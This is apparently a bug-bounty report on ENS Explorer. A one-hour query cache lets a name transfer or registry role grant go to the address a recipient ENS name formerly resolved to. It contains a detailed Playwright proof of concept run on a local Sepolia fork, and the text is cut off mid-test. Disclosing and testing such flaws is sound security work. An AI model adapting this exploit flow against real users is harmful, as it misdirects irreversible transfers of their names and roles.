# 92494 w a low apps portal transfer encodes a cached ens resolution as the recipient

## #92494 \[W\&A-Low] apps/portal: transfer encodes a cached ENS resolution as the recipient

**Submitted on Sep 10th 2026 at 09:56:03 UTC by @zaaf for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92494
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

### Description

Explorer resolves an ENS name typed into a recipient field through TanStack Query, and the application-wide client marks every query fresh for an hour. `SendNameForm` reads that cached value straight into `startTransfer`, and the Add-user sheets read it into a role grant. Nothing between the resolution and the signature reads the name's address record again. Leave the transfer form, come back to it, retype the same name, and Explorer prints the address it resolved earlier and moves the name to that address, even though the name now points somewhere else on chain.

## Vulnerability Details

`apps/portal/src/utils/queryClient.ts:3-8` creates the application's single `QueryClient` with `staleTime: 1000 * 60 * 60`. Nothing anywhere sets `gcTime`, so `@tanstack/query-core@5.90.12` applies its own default of five minutes (`build/modern/removable.js:17-21`, `newGcTime ?? (isServer ? Infinity : 5 * 60 * 1e3)`).

`getResolvedAddressQueryOptions` (`apps/portal/src/features/address/queries/getResolvedAddress.ts:34-45`) builds the key `['resolved-address', { nameOrAddress }]` and supplies no freshness of its own. It cannot: `resultQueryOptions` in `packages/utils/src/tanstack-query/neverthrow/query.ts:120-150` destructures `gcTime` and `staleTime` out of its input and never returns them, so every result-query in Explorer is pinned to the app-wide hour regardless of what it asks for. A forward resolution of an ENS name — a value whose whole purpose is to change when its owner changes it — is therefore held as fresh as a static constant.

`useAddressResolution` (`apps/portal/src/features/address/hooks/useAddressResolution.ts:47-63`) consumes that query, and its own documentation comment at `:38-46` describes it as "Shared by every 'name or address' input in the app (transfer recipient, add-user sheets, …)". Two of those inputs are demonstrated below.

**Transfer.** `SendNameForm` takes the resolved address as `recipient` (`apps/portal/src/features/transfer/components/SendNameForm.tsx:81-82`) and `runTransfer` hands it to `startTransfer` unchanged (`:106-109`). `useTransferName`'s prepare step reads only the token id and copies the recipient into `savedParams` (`apps/portal/src/features/transfer/hooks/useTransferName.ts:109-122`), and `transferToken` encodes it as the `to` argument of `safeTransferFrom` (`:142-144`, `apps/portal/src/features/transfer/helpers/transferToken.ts:67-71`). No step re-resolves. `RecipientPreview` renders the address in full rather than truncated (`SendNameForm.tsx:276-281`), so the form states the stale address with full confidence directly beneath a banner that reads "Transferring ownership of an ENS name is irreversible."

**Registry roles.** `RegistryAddUserSheet`'s close handler clears the input and the pending grant (`apps/portal/src/features/registry/components/v2/RegistryAddUserSheet.tsx:76-83`). Reopening the sheet and typing the same name produces the same query key, so the cached resolution is served with no network call. `handleSubmit` copies that address into `pendingGrant` (`:103-120`), `prepareGrantRegistryRolesTransaction` encodes it at resource `0`, the registry root (`:191-209`, `apps/portal/src/features/registry/helpers/grantRegistryRoles.ts:45-83`), and `handleStartTransaction` sends it (`:122-130`).

**Missing control:** before the resolved address is committed to `savedParams` or `pendingGrant`, and again before the transaction is sent, re-resolve the name — or invalidate `['resolved-address', { nameOrAddress }]` — and require the result to equal the address about to be encoded. A mismatch must re-render the resolution and rebuild the pending transaction.

**Where:** `apps/portal/src/utils/queryClient.ts:3-8`; `packages/utils/src/tanstack-query/neverthrow/query.ts:120-150`; `apps/portal/src/features/address/queries/getResolvedAddress.ts:34-45`; `apps/portal/src/features/address/hooks/useAddressResolution.ts:47-63`; `apps/portal/src/features/transfer/components/SendNameForm.tsx:81-82, 106-109, 276-281`; `apps/portal/src/features/transfer/hooks/useTransferName.ts:109-122, 142-144`; `apps/portal/src/features/transfer/helpers/transferToken.ts:67-71`; `apps/portal/src/features/registry/components/v2/RegistryAddUserSheet.tsx:76-83, 103-130, 191-209`; `apps/portal/src/features/registry/helpers/grantRegistryRoles.ts:45-83`.

**Discriminating control:** each demonstration carries a control arm in the same run, on the same fork, with the same wallet, the same registry, the same ENS name pattern and the same GraphQL responses. Only one variable differs: whether the page was reloaded after the name's address record changed. In the transfer pair, the arm that navigated away and back inside the app encodes the former address and the name ends up owned by it; the arm that reloaded encodes the current address and the name ends up owned by that instead. In the registry pair, the arm without a reload grants the registry root Set Resolver role to the former address and its later `setResolver` succeeds; the reloaded arm grants the role to the current address and the former address's identical `setResolver` reverts.

**Excluded-premise check:** the runs need no leaked key, no phishing, no wallet defect, no contract defect and no approval bypass. They do not rest on the indexer being stale or wrong: the stale value is Explorer's own query cache, and the address is read from the chain through the standard Universal Resolver, which returned the current address in every arm immediately before submission. Nothing at all is stubbed in the transfer demonstration. The registry demonstration stubs exactly two GraphQL operations, `getRegistryInfo` and `getRegistryRoles`, because the test registry is deployed on the local fork and no indexer can know it exists — and the identical stub serves both of its arms, so it cannot produce the difference between them. Name owner, name recipient, former address and current address are distinct keys throughout, and the former address could not restore the record itself; its attempt reverted.

## Impact Details

This matches the in-scope impact:

> Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
>
> * resolving or rendering an ENS name to an attacker-controlled address
> * showing the wrong recipient or amount on a transaction the user then approves

**The measured result, as the run prints it.** An owner transferred `vfy-tx-target-1789033064.eth` to the ENS name `vfy-tx-recip-1789033065.eth`. At the moment of submission that name resolved on chain to `0x90F79bf6EB2c4f870365E785982E1f101E93b906`. Approval sent a transaction carrying `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`, and after it was mined the name's owner was `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`:

```
ensNameResolvesTo                 0x90F79bf6EB2c4f870365E785982E1f101E93b906
recipientTheTransactionCarried    0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
tokenOwnerAfterTheMinedTransfer   0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
```

Differing only in a page reload, the control arm in the same run printed `0x90F79bf6…` on all three lines. The owner had been away from the form for 91.5 seconds, and returned through Explorer's own Back and Transfer links — a real client navigation and form remount, not a synthetic event. Throughout, the form displayed the full former address.

Transferring an ENS name this way is not reversible by the sender: the ERC-1155 token now sits with the address the form named, and only that address can move it back. Explorer's own banner on that screen says so.

**Attacker:** the controller of the address an ENS name pointed at before its owner moved the record elsewhere — the ordinary case being a rotation away from an address that is being decommissioned or is no longer trusted. It holds no authority over the name, the registry or the resolver before the victim submits, and takes no action until then. Its own attempt to write the record back reverted (`0xcfde4a93…`).

**Victim:** the owner of an ENS name, who resolves a recipient in the transfer form, steps away, comes back, relies on the address Explorer prints, and approves the transfer.

**The same cache reaches an authority grant.** In the registry-roles demonstration, Explorer displayed `Resolved: 0x3C44…93BC` while the name's on-chain record was `0x90F79bf6…`, and the approved transaction was `grantRootRoles(16777216, 0x3C44CdDd…)` — the Set Resolver role at the registry root. `hasRoles` returned true for that address after approval and again after a full page reload. Using only its own key, with the browser closed, it then installed a resolver it controls for two protected names in that registry, and the standard Universal Resolver returned `0x3C44CdDd…` for the first of them. In the paired reloaded arm the role went to `0x90F79bf6…` and `0x3C44CdDd…`'s identical `setResolver` reverted. This arm has the wider blast radius — a root role covers every name in the registry, not one name — and unlike the transfer it is repairable: the registry owner can revoke it in one `revokeRootRoles` call, after which the grantee's next `setResolver` reverts, though the resolver value already written has to be set back separately.

**Executed end-to-end:** yes — both arms of both demonstrations, through the Explorer production build in a browser on an isolated Sepolia fork, from typing the name to reading the name's owner and the Universal Resolver's answer back off the chain. Nothing was broadcast to a public network.

**Verified out of band:** the recipient name's address record was read three ways immediately before each submission — `getAddressRecord`, the standard Universal Resolver, and a direct `addr()` call on the resolver contract — and all three returned the current address in every arm. Independent decoding of the pending wallet request happened before approval. Final ownership came from `getState(tokenId).latestOwner`, and role state from `hasRoles`, after the transactions were mined.

Three limits belong with that result. Wallet requests carry the correct full value of the address being used, so no wallet deception or approval bypass is claimed; a user who compares the wallet calldata against a fresh resolution can stop it. Cache priming cannot be forced by the attacker, nor the record change, nor the victim's return; the window is bounded by the form's own lifetime, five minutes after it unmounts and one hour while it stays mounted. And the 34,567 wei transfer that appears in the registry proof of concept was sent by the test to whatever address the Universal Resolver returned — it shows where resolution now points, not that a real user sent funds.

## References

* [`queryClient.ts` — application-wide one-hour freshness](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/utils/queryClient.ts#L3-L8)
* [`neverthrow/query.ts` — `resultQueryOptions` discards per-query `staleTime` and `gcTime`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/packages/utils/src/tanstack-query/neverthrow/query.ts#L120-L150)
* [`getResolvedAddress.ts` — the `resolved-address` query](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/address/queries/getResolvedAddress.ts#L34-L45)
* [`useAddressResolution.ts` — the shared consumer hook](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/address/hooks/useAddressResolution.ts#L38-L63)
* [`SendNameForm.tsx` — resolved address becomes the transfer recipient, shown untruncated](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/transfer/components/SendNameForm.tsx#L81-L109)
* [`useTransferName.ts` — the recipient is carried through without a re-read](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/transfer/hooks/useTransferName.ts#L106-L146)
* [`transferToken.ts` — it becomes the `to` argument of `safeTransferFrom`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/transfer/helpers/transferToken.ts#L46-L72)
* [`RegistryAddUserSheet.tsx` — close clears the input, submit copies the cached address](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/registry/components/v2/RegistryAddUserSheet.tsx#L76-L130)
* [`grantRegistryRoles.ts` — root-resource role encoding](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/registry/helpers/grantRegistryRoles.ts#L45-L83)

### Proof of Concept

## Proof of Concept

Two demonstrations run here. Part A is the transfer: an owner sends an ENS name to an ENS name, and the name ends up owned by the address the recipient used to point at. Part B is the registry role grant, which reaches further — a role at the registry root rather than one name. Both run on an isolated Anvil fork of Sepolia against the Explorer production build compiled from the audited commit, driven through the app's real routes in a browser. Nothing is broadcast to a public network. Each part carries its control arm inside the same run.

Accounts come from the standard Anvil mnemonic and stay distinct throughout:

| actor                | address                                      | part                                                                 |
| -------------------- | -------------------------------------------- | -------------------------------------------------------------------- |
| name owner           | `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266` | connects the wallet and approves — the victim                        |
| recipient-name owner | `0x70997970C51812dc3A010C7d01b50e0d17dc79C8` | owns the ENS name typed into the form and changes its address record |
| former address A     | `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC` | the address that name pointed at before the change                   |
| current address B    | `0x90F79bf6EB2c4f870365E785982E1f101E93b906` | the address it points at when the transaction is signed              |

### 1. Anyone — check out the audited commit and install

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git ens-audit
cd ens-audit
git checkout cda79acaad59711b943fc68207ebb3f1d0ff8596
git status --porcelain --untracked-files=no      # must print nothing
corepack enable
pnpm install --frozen-lockfile
```

### 2. Anyone — bring up the local chain and fund the test accounts

```bash
pnpm e2e:infra:up
cp apps/portal/.env.ci apps/portal/.env
cp e2e/.env.ci e2e/.env
bash e2e/infra/scripts/fund-rhinestone-account.sh
bash e2e/infra/scripts/fund-account.sh 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```

`pnpm e2e:infra:up` starts Anvil forking Sepolia on `127.0.0.1:8545` together with the bundler, paymaster, orchestrator and indexer the app expects.

### 3. Anyone — build Explorer exactly as it ships and serve it

```bash
pnpm --filter portal exec vite build          # writes apps/portal/dist/client, 610 files
mkdir -p poc && cd poc
echo '{"type":"module"}' > package.json
ln -sfn ../e2e/node_modules node_modules
mkdir -p runtime
cat > static-production-server.mjs <<'SERVER'
import { createReadStream, statSync } from 'node:fs'
import { createServer, request as httpRequest } from 'node:http'
import { extname, join, normalize } from 'node:path'
import { fileURLToPath } from 'node:url'

const root = fileURLToPath(new URL('../apps/portal/dist/client/', import.meta.url))
const listenPort = Number(process.env.APP_PORT ?? 4287)
const rpcPort = Number(process.env.RPC_PORT ?? 8545)
const routes = new Map([
  ['/rpc', rpcPort],
  ['/bundler', 4337],
  ['/paymaster', 3002],
  ['/indexer', 5655],
  ['/orchestrator', 3007],
])
const types = new Map([
  ['.html', 'text/html; charset=utf-8'],
  ['.js', 'text/javascript; charset=utf-8'],
  ['.css', 'text/css; charset=utf-8'],
  ['.json', 'application/json; charset=utf-8'],
  ['.svg', 'image/svg+xml'],
  ['.png', 'image/png'],
  ['.ico', 'image/x-icon'],
  ['.woff2', 'font/woff2'],
  ['.ttf', 'font/ttf'],
])

createServer((req, res) => {
  const url = new URL(req.url ?? '/', 'http://127.0.0.1')
  const proxy = [...routes].find(([prefix]) =>
    url.pathname === prefix || url.pathname.startsWith(`${prefix}/`))
  if (proxy) {
    const [prefix, port] = proxy
    const path = `${url.pathname.slice(prefix.length) || '/'}${url.search}`
    const upstream = httpRequest({
      hostname: '127.0.0.1', port, path, method: req.method, headers: req.headers,
    }, (reply) => {
      res.writeHead(reply.statusCode ?? 502, reply.headers)
      reply.pipe(res)
    })
    upstream.on('error', (error) => {
      res.writeHead(502, { 'content-type': 'text/plain; charset=utf-8' })
      res.end(`proxy error: ${error.message}`)
    })
    req.pipe(upstream)
    return
  }
  const requested = normalize(decodeURIComponent(url.pathname)).replace(/^(\.\.[/\\])+/, '')
  let file = join(root, requested)
  try {
    if (!statSync(file).isFile()) file = join(root, 'index.html')
  } catch {
    file = join(root, 'index.html')
  }
  res.writeHead(200, {
    'content-type': types.get(extname(file)) ?? 'application/octet-stream',
    'cache-control': 'no-store',
  })
  if (req.method === 'HEAD') res.end()
  else createReadStream(file).pipe(res)
}).listen(listenPort, '127.0.0.1', () => {
  process.stdout.write(`production client on http://127.0.0.1:${listenPort}\n`)
})
SERVER
node static-production-server.mjs &
```

## Part A — the transfer lands on the address the name used to have

### A1. Anyone — write the paired test

Save this as `poc/transfer-stale-recipient.spec.ts`. It holds two tests: the journey, then the control. They differ in one thing — the control reloads the page after the record changes.

```ts
import { writeFile } from 'node:fs/promises'
import { resolve } from 'node:path'
import { Web3RequestKind } from '@ensdomains/headless-web3-provider'
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getResolver, getAddressRecord } from '@ensdomains/ensjs/public'
import { setRecords } from '@ensdomains/ensjs/wallet'
import {
  createWalletClient,
  decodeFunctionData,
  encodeFunctionData,
  getAddress,
  http,
  keccak256,
  namehash,
  parseAbi,
  toHex,
} from 'viem'
import { getEnsAddress } from 'viem/actions'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

import {
  connectWithHeadlessWallet,
  expect,
  test,
} from '../e2e/fixtures/playwright.portal.fixture.js'
import { publicClient } from '../e2e/helpers/anvil-client.js'
import { universalResolverAddress } from '../apps/portal/src/lib/constants/universalResolver.js'

const APP = process.env.PORTAL_APP_URL ?? 'http://127.0.0.1:4194'
const RPC = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const OUTPUT = resolve(import.meta.dirname, 'runtime')
const erc1155Abi = parseAbi([
  'function safeTransferFrom(address from,address to,uint256 id,uint256 amount,bytes data)',
])
const resolverAbi = parseAbi([
  'function setAddr(bytes32 node,uint256 coinType,bytes value)',
  'function addr(bytes32 node,uint256 coinType) view returns (bytes)',
])
const registryAbi = parseAbi([
  'function getTokenId(uint256 anyId) view returns (uint256)',
  'function getState(uint256 anyId) view returns ((uint8 status,uint64 expiry,address latestOwner,uint256 tokenId,uint256 resource) state)',
])
const ETH_REGISTRY = ensL1Contracts[supportedL1Chains.sepolia].ensRegistry.address

async function writeEthRecord(
  name: string,
  resolverAddress: `0x${string}`,
  privateKey: `0x${string}`,
  recipient: `0x${string}`,
) {
  const account = privateKeyToAccount(privateKey)
  const wallet = createWalletClient({ account, chain: sepolia, transport: http(RPC) })
  const hash = await setRecords(wallet, {
    name,
    resolverAddress,
    coins: [{ coin: 60, value: recipient }],
  })
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('success')
  return hash
}

async function liveAddress(name: string) {
  const record = await getAddressRecord(publicClient, { name, coin: 'ETH' })
  return record ? getAddress(record.value) : null
}

async function universalAddress(name: string) {
  const result = await getEnsAddress(publicClient, {
    name,
    universalResolverAddress,
  })
  return result ? getAddress(result) : null
}

async function directResolverAddress(
  name: string,
  resolverAddress: `0x${string}`,
) {
  const bytes = await publicClient.readContract({
    address: resolverAddress,
    abi: resolverAbi,
    functionName: 'addr',
    args: [namehash(name), 60n],
  })
  return getAddress(`0x${bytes.slice(-40)}`)
}

async function unauthorizedOldAddressWrite(
  name: string,
  resolverAddress: `0x${string}`,
  privateKey: `0x${string}`,
  oldRecipient: `0x${string}`,
) {
  const account = privateKeyToAccount(privateKey)
  const wallet = createWalletClient({ account, chain: sepolia, transport: http(RPC) })
  const hash = await wallet.sendTransaction({
    account,
    to: resolverAddress,
    gas: 1_000_000n,
    data: encodeFunctionData({
      abi: resolverAbi,
      functionName: 'setAddr',
      args: [namehash(name), 60n, oldRecipient],
    }),
  })
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('reverted')
  return { hash, status: receipt.status }
}

test('ordinary abandon-and-return transfer journey submits the cached former ENS recipient', async ({
  portalPage: page,
  wallet,
  accounts,
  makeName,
}) => {
  test.setTimeout(300_000)

  const targetName = await makeName({ label: 'vfy-tx-target', owner: 'user' })
  const recipientName = await makeName({
    label: 'vfy-tx-recip',
    owner: 'user2',
    records: [{ key: 'description', value: 'verification recipient' }],
  })
  const oldRecipient = accounts.getAddress('user3')
  const currentRecipient = accounts.getAddress('user4')
  const recipientResolver = await getResolver(publicClient, { name: recipientName })
  const initialWriteHash = await writeEthRecord(
    recipientName,
    recipientResolver,
    accounts.getPrivateKey('user2'),
    oldRecipient,
  )
  expect(await liveAddress(recipientName)).toBe(oldRecipient)

  const walletRequests: Array<{ method: string; params: unknown }> = []
  const originalRequest = wallet.request.bind(wallet)
  wallet.request = async (request: any) => {
    if (request?.method === 'eth_sendTransaction') {
      walletRequests.push({ method: request.method, params: request.params })
    }
    return originalRequest(request)
  }

  await connectWithHeadlessWallet(page, wallet)
  await page.goto(`${APP}/${targetName}/ownership/transfer`)
  await expect(page.getByRole('heading', { name: 'Transfer ownership' })).toBeVisible({ timeout: 30_000 })

  const input = page.getByPlaceholder('ENS name or address')
  await input.fill(recipientName)
  await expect(page.getByText(oldRecipient, { exact: true })).toBeVisible({ timeout: 30_000 })
  const warningText =
    'Transferring ownership of an ENS name is irreversible. Make sure you check the recipient address before proceeding.'
  await expect(page.getByText(warningText, { exact: true })).toBeVisible()
  const primeTimestamp = Date.now()

  // This is an ordinary user action: the owner previews an intended ENS
  // recipient, then backs out of the transfer without opening a wallet.
  expect(walletRequests).toHaveLength(0)
  await page.getByRole('link', { name: 'Back' }).click()
  await expect(page.getByRole('link', { name: 'Transfer' })).toBeVisible({ timeout: 30_000 })
  const abandonedAt = Date.now()

  // Independently, the alias owner rotates the record from a compromised old
  // recipient to the safe current recipient while the victim is off the form.
  const correctionHash = await writeEthRecord(
    recipientName,
    recipientResolver,
    accounts.getPrivateKey('user2'),
    currentRecipient,
  )
  expect(await liveAddress(recipientName)).toBe(currentRecipient)
  expect(await universalAddress(recipientName)).toBe(currentRecipient)
  expect(await directResolverAddress(recipientName, recipientResolver)).toBe(currentRecipient)
  const unauthorizedControl = await unauthorizedOldAddressWrite(
    recipientName,
    recipientResolver,
    accounts.getPrivateKey('user3'),
    oldRecipient,
  )
  expect(await liveAddress(recipientName)).toBe(currentRecipient)

  // Independent verifier addition: stay off the form for 90 s of real wall time,
  // far past any debounce or in-flight request, before returning to it.
  const abandonedForMs = 90_000
  await page.waitForTimeout(abandonedForMs)

  // The owner naturally returns through Portal's Transfer link. This is a real
  // client navigation and form remount; no synthetic focus/visibility event is
  // dispatched or claimed.
  await page.getByRole('link', { name: 'Transfer' }).click()
  await expect(page.getByRole('heading', { name: 'Transfer ownership' })).toBeVisible()
  const remountedInput = page.getByPlaceholder('ENS name or address')
  await remountedInput.fill(recipientName)
  await expect(page.getByText(oldRecipient, { exact: true })).toBeVisible({ timeout: 15_000 })
  await expect(page.getByText(currentRecipient, { exact: true })).toHaveCount(0)
  await expect(page.getByText(warningText, { exact: true })).toBeVisible()
  const remountedAt = Date.now()
  await page.screenshot({ path: resolve(OUTPUT, '01-natural-remount-shows-full-stale-address.png'), fullPage: true })

  // Reduce the flow to its irreversible ERC-1155 transfer step.
  for (const label of [
    'Detach the resolver',
    'Set the ETH address to the recipient',
    'Detach the registry',
  ]) {
    const toggle = page.getByRole('switch', { name: new RegExp(label, 'i') })
    if ((await toggle.count()) && (await toggle.isChecked()) && (await toggle.isEnabled())) {
      await toggle.click()
    }
  }

  await page.getByRole('button', { name: 'Transfer name' }).click()
  const dialog = page.locator('[data-slot="dialog-content"]')
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', { name: /^Start$/ }).click()
  await dialog.getByRole('button', { name: /Open wallet/i }).click()
  await expect.poll(() => wallet.getPendingRequestCount(Web3RequestKind.SendTransaction)).toBe(1)

  const pending = walletRequests.at(-1)
  expect(pending?.method).toBe('eth_sendTransaction')
  const tx = (pending!.params as Array<{ from: string; to: string; data: `0x${string}` }>)[0]
  const decoded = decodeFunctionData({ abi: erc1155Abi, data: tx.data })
  expect(decoded.functionName).toBe('safeTransferFrom')
  expect(getAddress(decoded.args[1])).toBe(oldRecipient)
  await page.screenshot({ path: resolve(OUTPUT, '02-truthful-pending-transfer-flow.png'), fullPage: true })

  // The wallet request is truthful about OLD and still needs the owner's
  // explicit authorization. Authorizing proves the separate UI cache defect
  // reaches the irreversible chain result; it does not claim wallet deception.
  await wallet.authorize(Web3RequestKind.SendTransaction)
  const targetLabel = targetName.slice(0, -4)
  const targetTokenId = await publicClient.readContract({
    address: ETH_REGISTRY,
    abi: registryAbi,
    functionName: 'getTokenId',
    args: [BigInt(keccak256(toHex(targetLabel)))],
  })
  await expect.poll(async () => {
    const state = await publicClient.readContract({
      address: ETH_REGISTRY,
      abi: registryAbi,
      functionName: 'getState',
      args: [targetTokenId],
    })
    return getAddress(state.latestOwner)
  }, { timeout: 60_000 }).toBe(oldRecipient)
  const finalState = await publicClient.readContract({
    address: ETH_REGISTRY,
    abi: registryAbi,
    functionName: 'getState',
    args: [targetTokenId],
  })

  await writeFile(resolve(OUTPUT, 'browser-verdict.json'), `${JSON.stringify({
    pass: true,
    sourceCommit: 'cda79acaad59711b943fc68207ebb3f1d0ff8596',
    productionBuild: true,
    route: `/${targetName}/ownership/transfer`,
    targetName,
    recipientName,
    recipientResolver,
    oldRecipient,
    currentRecipient,
    primeTimestamp,
    abandonedAt,
    remountedAt,
    submitTimestamp: Date.now(),
    elapsedMs: Date.now() - primeTimestamp,
    initialWriteHash,
    correctionHash,
    unauthorizedOldAddressControl: unauthorizedControl,
    liveAddressBeforeSubmit: await liveAddress(recipientName),
    standardUniversalResolverBeforeSubmit: await universalAddress(recipientName),
    directResolverAddressBeforeSubmit: await directResolverAddress(recipientName, recipientResolver),
    lifecycle: {
      naturalPrimeInTransferForm: true,
      abandonedWithoutWalletRequest: true,
      realBackTransferClientRemount: true,
      abandonedForMs,
      syntheticFocusOrVisibilityUsed: false,
      elapsedPrimeToRemountMs: remountedAt - primeTimestamp,
      withinOneHourFreshWindow: remountedAt - primeTimestamp < 3_600_000,
    },
    visibleWarning: warningText,
    displayedRecipientAfterRealClientRemount: oldRecipient,
    walletRequest: {
      method: pending!.method,
      from: tx.from,
      to: tx.to,
      data: tx.data,
      decodedFunction: decoded.functionName,
      decodedRecipient: decoded.args[1],
      explicitAuthorizationRequired: true,
      explicitAuthorizationPerformed: true,
    },
    onChain: {
      registry: ETH_REGISTRY,
      tokenId: targetTokenId.toString(),
      latestOwnerAfterAuthorization: finalState.latestOwner,
    },
    theFinding: {
      ensNameResolvesTo: await liveAddress(recipientName),
      recipientTheTransactionCarried: getAddress(decoded.args[1] as `0x${string}`),
      tokenOwnerAfterTheMinedTransfer: getAddress(finalState.latestOwner),
    },
    truthfulWalletBoundary: 'The wallet request accurately encoded OLD and required owner approval; the defect is Portal reusing a stale ENS resolution after the name controller rotated the live record to CURRENT.',
  }, null, 2)}\n`)
})

test('full reload clears the recipient cache and resolves the rotated current address', async ({
  portalPage: page,
  wallet,
  accounts,
  makeName,
}) => {
  test.setTimeout(300_000)

  const targetName = await makeName({ label: 'vfy-cold-target', owner: 'user' })
  const recipientName = await makeName({
    label: 'vfy-cold-recip',
    owner: 'user2',
    records: [{ key: 'description', value: 'verification cold control' }],
  })
  const oldRecipient = accounts.getAddress('user3')
  const currentRecipient = accounts.getAddress('user4')
  const recipientResolver = await getResolver(publicClient, { name: recipientName })
  const initialWriteHash = await writeEthRecord(
    recipientName,
    recipientResolver,
    accounts.getPrivateKey('user2'),
    oldRecipient,
  )

  await connectWithHeadlessWallet(page, wallet)
  await page.goto(`${APP}/${targetName}/ownership/transfer`)
  await expect(page.getByRole('heading', { name: 'Transfer ownership' })).toBeVisible({ timeout: 30_000 })
  const input = page.getByPlaceholder('ENS name or address')
  await input.fill(recipientName)
  await expect(page.getByText(oldRecipient, { exact: true })).toBeVisible({ timeout: 30_000 })

  const correctionHash = await writeEthRecord(
    recipientName,
    recipientResolver,
    accounts.getPrivateKey('user2'),
    currentRecipient,
  )
  expect(await liveAddress(recipientName)).toBe(currentRecipient)

  await page.reload()
  await expect(page.getByRole('heading', { name: 'Transfer ownership' })).toBeVisible({ timeout: 30_000 })
  const reloadedInput = page.getByPlaceholder('ENS name or address')
  await reloadedInput.fill(recipientName)
  await expect(page.getByText(currentRecipient, { exact: true })).toBeVisible({ timeout: 30_000 })
  await expect(page.getByText(oldRecipient, { exact: true })).toHaveCount(0)

  // Independent verifier addition: the original control stopped at the label.
  // Carry the control arm through the same irreversible transfer so the pair is
  // symmetric — same flow, same wallet, same contracts, fresh resolution.
  const coldWalletRequests: Array<{ method: string; params: unknown }> = []
  const coldOriginalRequest = wallet.request.bind(wallet)
  wallet.request = async (request: any) => {
    if (request?.method === 'eth_sendTransaction') {
      coldWalletRequests.push({ method: request.method, params: request.params })
    }
    return coldOriginalRequest(request)
  }

  for (const label of [
    'Detach the resolver',
    'Set the ETH address to the recipient',
    'Detach the registry',
  ]) {
    const toggle = page.getByRole('switch', { name: new RegExp(label, 'i') })
    if ((await toggle.count()) && (await toggle.isChecked()) && (await toggle.isEnabled())) {
      await toggle.click()
    }
  }

  await page.getByRole('button', { name: 'Transfer name' }).click()
  const coldDialog = page.locator('[data-slot="dialog-content"]')
  await expect(coldDialog).toBeVisible()
  await coldDialog.getByRole('button', { name: /^Start$/ }).click()
  await coldDialog.getByRole('button', { name: /Open wallet/i }).click()
  await expect.poll(() => wallet.getPendingRequestCount(Web3RequestKind.SendTransaction)).toBe(1)
  const coldPending = coldWalletRequests.at(-1)
  const coldTx = (coldPending!.params as Array<{ from: string; to: string; data: `0x${string}` }>)[0]
  const coldDecoded = decodeFunctionData({ abi: erc1155Abi, data: coldTx.data })
  expect(coldDecoded.functionName).toBe('safeTransferFrom')
  expect(getAddress(coldDecoded.args[1])).toBe(currentRecipient)
  await wallet.authorize(Web3RequestKind.SendTransaction)

  const coldLabel = targetName.slice(0, -4)
  const coldTokenId = await publicClient.readContract({
    address: ETH_REGISTRY,
    abi: registryAbi,
    functionName: 'getTokenId',
    args: [BigInt(keccak256(toHex(coldLabel)))],
  })
  await expect.poll(async () => {
    const state = await publicClient.readContract({
      address: ETH_REGISTRY,
      abi: registryAbi,
      functionName: 'getState',
      args: [coldTokenId],
    })
    return getAddress(state.latestOwner)
  }, { timeout: 60_000 }).toBe(currentRecipient)
  const coldFinalState = await publicClient.readContract({
    address: ETH_REGISTRY,
    abi: registryAbi,
    functionName: 'getState',
    args: [coldTokenId],
  })
  expect(getAddress(coldFinalState.latestOwner)).not.toBe(oldRecipient)

  await writeFile(resolve(OUTPUT, 'browser-cold-control.json'), `${JSON.stringify({
    theFinding: {
      ensNameResolvesTo: await liveAddress(recipientName),
      recipientTheTransactionCarried: getAddress(coldDecoded.args[1] as `0x${string}`),
      tokenOwnerAfterTheMinedTransfer: getAddress(coldFinalState.latestOwner),
    },
    coldWalletRequest: {
      decodedFunction: coldDecoded.functionName,
      decodedRecipient: coldDecoded.args[1],
      explicitAuthorizationPerformed: true,
    },
    coldOnChain: {
      registry: ETH_REGISTRY,
      tokenId: coldTokenId.toString(),
      latestOwnerAfterAuthorization: coldFinalState.latestOwner,
    },
    pass: true,
    sourceCommit: 'cda79acaad59711b943fc68207ebb3f1d0ff8596',
    productionBuild: true,
    control: 'full-page reload creates a new global QueryClient',
    route: `/${targetName}/ownership/transfer`,
    recipientName,
    recipientResolver,
    oldRecipient,
    currentRecipient,
    initialWriteHash,
    correctionHash,
    liveAfterCorrection: await liveAddress(recipientName),
    displayedAfterReload: currentRecipient,
